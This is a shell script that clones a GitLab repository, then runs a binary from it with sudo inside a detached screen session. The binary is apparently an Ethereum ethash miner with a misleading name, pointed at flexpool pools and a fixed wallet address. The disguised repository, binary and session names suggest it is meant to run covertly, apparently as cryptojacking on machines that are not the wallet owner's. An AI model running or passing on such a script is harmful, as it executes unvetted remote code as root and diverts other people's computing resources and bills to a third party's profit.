#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS sahuman.sh 65 75
sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
cd sainame127
chmod +x itsme
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0xf53472b6f7a30d6f6f84cf2e85f29f3bc78a2ef7 -p stratum+tcp://eth-hk.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
